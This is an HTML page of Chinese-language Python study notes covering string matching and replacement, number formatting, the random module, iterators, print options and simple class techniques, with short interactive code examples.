<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>filename = <span class="string">&#x27;spam.txt&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>filename.endswith(<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">url = <span class="string">&#x27;http://www.python.org&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url.startswith(<span class="string">&#x27;http:&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="用Shell通配符匹配字符串"><a href="#用Shell通配符匹配字符串" class="headerlink" title="用Shell通配符匹配字符串"></a>用Shell通配符匹配字符串</h3><p>Python中可以使用<code>fnmatch()</code>和<code>fnmatchcase()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fnmatch <span class="keyword">import</span> fnmatch, fnmatchcase</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">&#x27;foo.txt&#x27;</span>, <span class="string">&#x27;*.txt&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">&#x27;foo.txt&#x27;</span>, <span class="string">&#x27;?oo.txt&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">&#x27;Dat45.csv&#x27;</span>, <span class="string">&#x27;Dat[0-9]*&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串搜索匹配"><a href="#字符串搜索匹配" class="headerlink" title="字符串搜索匹配"></a>字符串搜索匹配</h3><p>在字符串中搜索字符串，并返回下标， 使用find()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;yeah, but no, but yeah&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.find(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.find(<span class="string">&#x27;not&#x27;</span>)</span><br><span class="line">-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>对于复杂匹配使用正则表达式和re模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text1 = <span class="string">&#x27;11/27/2012&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text2 = <span class="string">&#x27;Nov 27, 2012&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Simple matching: \d+ means match one or more digits</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+/\d+/\d+&#x27;</span>, text1):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">yes</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+/\d+/\d+&#x27;</span>, text2):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">no</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>注：如果使用同一个模式去多次匹配，应该将模式串预编译为模式对象，比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>datepat = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+/\d+/\d+&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> datepat.<span class="keyword">match</span>(text1):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">yes</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> datepat.<span class="keyword">match</span>(text2):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">no</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="字符串搜索和替换"><a href="#字符串搜索和替换" class="headerlink" title="字符串搜索和替换"></a>字符串搜索和替换</h3><p>对于简单字符串替换，用str.replace()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;yeah, but no, but yeah, but no, but yeah&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.replace(<span class="string">&#x27;yeah&#x27;</span>, <span class="string">&#x27;yep&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;yep, but no, but yep, but no, but yep&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对于复杂的模式，用re模块的sub函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;Today is 11/27/2012. PyCon starts 3/13/2013.&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r&#x27;(\d+)/(\d+)/(\d+)&#x27;</span>, <span class="string">r&#x27;\3-\1-\2&#x27;</span>, text)</span><br><span class="line"><span class="string">&#x27;Today is 2012-11-27. PyCon starts 2013-3-13.&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="x20-字符串忽略大小写的搜索替换"><a href="#x20-字符串忽略大小写的搜索替换" class="headerlink" title="&#x20;字符串忽略大小写的搜索替换"></a>&#x20;字符串忽略大小写的搜索替换</h3><p>使用re模块时添加re.IGNORECASE参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;UPPER PYTHON, lower python, Mixed Python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(<span class="string">&#x27;python&#x27;</span>, text, flags=re.IGNORECASE)</span><br><span class="line">[<span class="string">&#x27;PYTHON&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;snake&#x27;</span>, text, flags=re.IGNORECASE)</span><br><span class="line"><span class="string">&#x27;UPPER snake, lower snake, Mixed snake&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="删除字符串中不需要的字符"><a href="#删除字符串中不需要的字符" class="headerlink" title="删除字符串中不需要的字符"></a>删除字符串中不需要的字符</h3><p>strip方法可以删除开头和结尾的空白字符</p>
<p>lstrip()和rstrip()分别从左和从右执行删除操作</p>
<p>除了默认的空白字符，也可以指定其他字符，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27; hello world \n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.strip()</span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.lstrip()</span><br><span class="line"><span class="string">&#x27;hello world \n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.rstrip()</span><br><span class="line"><span class="string">&#x27; hello world&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Character stripping</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">&#x27;-----hello=====&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.lstrip(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;hello=====&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.strip(<span class="string">&#x27;-=&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>如果要删除中间的空格，需要用其他技术， 比如replace方法或正则表达式替换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27; hello     world \n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;helloworld&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串对齐"><a href="#字符串对齐" class="headerlink" title="字符串对齐"></a>字符串对齐</h3><p>基本的字符串对齐操作，可以使用字符串的ljust(),rjust(),center()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.ljust(<span class="number">20</span>)</span><br><span class="line"><span class="string">&#x27;Hello World         &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>)</span><br><span class="line"><span class="string">&#x27;         Hello World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>)</span><br><span class="line"><span class="string">&#x27;    Hello World     &#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>,<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;=========Hello World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;****Hello World*****&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="合并字符串"><a href="#合并字符串" class="headerlink" title="合并字符串"></a>合并字符串</h3><p>如果待合并的字符串在一个序列中， 最快的方法是使用join()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parts = [<span class="string">&#x27;Is&#x27;</span>, <span class="string">&#x27;Chicago&#x27;</span>, <span class="string">&#x27;Not&#x27;</span>, <span class="string">&#x27;Chicago?&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27; &#x27;</span>.join(parts)</span><br><span class="line"><span class="string">&#x27;Is Chicago Not Chicago?&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;|&#x27;</span>.join(parts)</span><br><span class="line"><span class="string">&#x27;Is|Chicago|Not|Chicago?&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.join(parts)</span><br><span class="line"><span class="string">&#x27;IsChicagoNotChicago?&#x27;</span></span><br></pre></td></tr></table></figure>

<p>注意不必要的字符串连接操作，比如打印时</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(a + <span class="string">&#x27;:&#x27;</span> + b + <span class="string">&#x27;:&#x27;</span> + c) <span class="comment"># Ugly</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;:&#x27;</span>.join([a, b, c])) <span class="comment"># Still ugly</span></span><br><span class="line"><span class="built_in">print</span>(a, b, c, sep=<span class="string">&#x27;:&#x27;</span>) <span class="comment"># Better</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串中插入变量"><a href="#字符串中插入变量" class="headerlink" title="字符串中插入变量"></a>字符串中插入变量</h3><p>使用format函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#123;name&#125; has &#123;n&#125; message.&#x27;</span>.<span class="built_in">format</span>(name=<span class="string">&#x27;peter&#x27;</span>, n=<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;peter has 5 message.&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="三、数字日期和时间"><a href="#三、数字日期和时间" class="headerlink" title="三、数字日期和时间"></a>三、数字日期和时间</h2><h3 id="数字四舍五入"><a href="#数字四舍五入" class="headerlink" title="数字四舍五入"></a>数字四舍五入</h3><p>简单的舍入运算，使用内置round(value, ndigits)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">1.23</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">1.2</span></span><br></pre></td></tr></table></figure>

<p>格式化输出，使用内置format函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1234.56789</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">format</span>(x, <span class="string">&#x27;0.2f&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="二八十六进制整数"><a href="#二八十六进制整数" class="headerlink" title="二八十六进制整数"></a>二八十六进制整数</h3><p>为了将整数转为二进制，八进制，十六进制文本串。分别使用bin, oct, hex函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(x)</span><br><span class="line"><span class="string">&#x27;0b10011010010&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">oct</span>(x)</span><br><span class="line"><span class="string">&#x27;0o2322&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(x)</span><br><span class="line"><span class="string">&#x27;0x4d2&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">format</span>(x, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;10011010010&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="随机选择"><a href="#随机选择" class="headerlink" title="随机选择"></a>随机选择</h3><p>使用random.choice()， 从一个序列中随机抽取一个元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.sample(values, <span class="number">3</span>)</span><br><span class="line">[<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<p>随机打乱元素顺序， 使用random.shuffle()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.shuffle(values)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>生成随机整数，用random.randint()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randint(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>生成0-1的浮点数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.random()</span><br><span class="line"><span class="number">0.9406677561675867</span></span><br></pre></td></tr></table></figure>

<h2 id="第四章-迭代器与生成器"><a href="#第四章-迭代器与生成器" class="headerlink" title="第四章 迭代器与生成器"></a>第四章 迭代器与生成器</h2><h3 id="不用for语句迭代"><a href="#不用for语句迭代" class="headerlink" title="不用for语句迭代"></a>不用for语句迭代</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">it = <span class="built_in">iter</span>(L)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = <span class="built_in">next</span>(it)</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"><span class="keyword">except</span> StopIteration:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="反向迭代"><a href="#反向迭代" class="headerlink" title="反向迭代"></a>反向迭代</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">reversed</span>(a):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="序列上索引值迭代"><a href="#序列上索引值迭代" class="headerlink" title="序列上索引值迭代"></a>序列上索引值迭代</h3><h3 id="迭代同时，跟踪被处理元素索引"><a href="#迭代同时，跟踪被处理元素索引" class="headerlink" title="迭代同时，跟踪被处理元素索引"></a>迭代同时，跟踪被处理元素索引</h3><p>使用内置的<code>enumerate</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_list = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(my_list):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(idx, val)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure>

<p>指定开始参数</p>
<pre><code>&gt;&gt;&gt; my_list = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
&gt;&gt;&gt; for idx, val in enumerate(my_list, 1):
... print(idx, val)
...
1 a
2 b
3 c
</code></pre>
<h3 id="同时迭代多个序列"><a href="#同时迭代多个序列" class="headerlink" title="同时迭代多个序列"></a>同时迭代多个序列</h3><p>使用zip函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xpts = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">ypts = [<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(xpts,ypts):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;x=&#123;&#125;, y=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, y))</span><br></pre></td></tr></table></figure>

<p>zip函数会创建一个迭代器作为结果返回，如果需要将结对值存到列表，使用list函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">zip</span>(a, b)</span><br><span class="line">&lt;<span class="built_in">zip</span> <span class="built_in">object</span> at <span class="number">0x1007001b8</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">zip</span>(a, b))</span><br><span class="line">[(<span class="number">1</span>, <span class="number">10</span>), (<span class="number">2</span>, <span class="number">11</span>), (<span class="number">3</span>, <span class="number">12</span>)]</span><br></pre></td></tr></table></figure>

<h2 id="不同集合上元素迭代"><a href="#不同集合上元素迭代" class="headerlink" title="不同集合上元素迭代"></a>不同集合上元素迭代</h2><p>场景：想在多个对象执行相同操作， 但对象在不同容器中，希望代码在不失可读性情况下避免写重复循环</p>
<p>使用itertools.chain()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> chain(a, b):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(x)</span><br><span class="line">...</span><br><span class="line">1234xyz</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="x20-顺序迭代合并后排序迭代对象"><a href="#x20-顺序迭代合并后排序迭代对象" class="headerlink" title="&#x20;顺序迭代合并后排序迭代对象"></a>&#x20;顺序迭代合并后排序迭代对象</h2><p>使用heapq.merge()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> heapq</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> heapq.merge(a, b):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(c)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>heapq.merge</code> 可迭代特性意味着它不会立马读取所有序列。 这就意味着你可以在非常长的序列中使用它，而不会有太大的开销。</p>
<p><code>heapq.merge()</code> 需要所有输入序列必须是排过序的。</p>
<h2 id="使用其他分隔符或行终止符打印"><a href="#使用其他分隔符或行终止符打印" class="headerlink" title="使用其他分隔符或行终止符打印"></a>使用其他分隔符或行终止符打印</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ACME&#x27;</span>,<span class="number">50</span>,sep=<span class="string">&#x27;,&#x27;</span>,end=<span class="string">&#x27;!!\n&#x27;</span>)</span><br><span class="line">ACME,<span class="number">50</span>!!</span><br></pre></td></tr></table></figure>

<p>输出中禁止换行，用end参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	<span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> &gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="定义有默认参数的函数"><a href="#定义有默认参数的函数" class="headerlink" title="定义有默认参数的函数"></a>定义有默认参数的函数</h3><p>默认参数的值仅仅在函数定义的时候赋值一次</p>
<p>默认参数的值应该是不可变的对象，比如None、True、False、数字或字符串</p>
<p>测试None值时使用 <code>is</code> 操作符是很重要的</p>
<h2 id="八、类对象"><a href="#八、类对象" class="headerlink" title="八、类对象"></a>八、类对象</h2><h3 id="改变一个实例字符串表示，可通过重新定义str和repr方法实现："><a href="#改变一个实例字符串表示，可通过重新定义str和repr方法实现：" class="headerlink" title="改变一个实例字符串表示，可通过重新定义str和repr方法实现："></a>改变一个实例字符串表示，可通过重新定义str和repr方法实现：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">		<span class="variable language_">self</span>.x = x</span><br><span class="line">		<span class="variable language_">self</span>.y = y</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="类中定义等多个构造器"><a href="#类中定义等多个构造器" class="headerlink" title="类中定义等多个构造器"></a>类中定义等多个构造器</h3><p>想实现一个类，除了使用init方法，还有其他方法初始化它</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>:</span><br><span class="line"><span class="string">&quot;&quot;&quot; 方法一：使用类方法&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># Primary constructor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, year, month, day</span>):</span><br><span class="line"><span class="variable language_">self</span>.year = year</span><br><span class="line"><span class="variable language_">self</span>.month = month</span><br><span class="line"><span class="variable language_">self</span>.day = day</span><br><span class="line"><span class="comment"># Alternate constructor</span></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">today</span>(<span class="params">cls</span>):</span><br><span class="line">t = time.localtime()</span><br><span class="line"><span class="keyword">return</span> cls(t.tm_year, t.tm_mon, t.tm_mday)</span><br><span class="line"></span><br><span class="line">a = Date(<span class="number">2012</span>, <span class="number">12</span>, <span class="number">21</span>) <span class="comment"># Primary</span></span><br><span class="line">b = Date.today() <span class="comment"># Alternate</span></span><br></pre></td></tr></table></figure>

<p>通过字符串调用对象方法</p>
<p>使用attr方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Point(&#123;!r:&#125;,&#123;!r:&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="keyword">return</span> math.hypot(<span class="variable language_">self</span>.x - x, <span class="variable language_">self</span>.y - y)</span><br><span class="line">p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">d = <span class="built_in">getattr</span>(p, <span class="string">&#x27;distance&#x27;</span>)(<span class="number">0</span>, <span class="number">0</span>) <span class="comment"># Calls p.distance(0, 0)</span></span><br></pre></td></tr></table></figure>

<p>另一种方法是使用operator.methodcaller()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">operator.methodcaller(<span class="string">&#x27;distance&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)(p)</span><br></pre></td></tr></table></figure>

<h2 id="第十一章-网络与web编程"><a href="#第十一章-网络与web编程" class="headerlink" title="第十一章 网络与web编程"></a>第十一章 网络与web编程</h2><p>HTTP请求 urllib.request</p>
<p>创建TCP服务器 socketserver (单线程)</p>
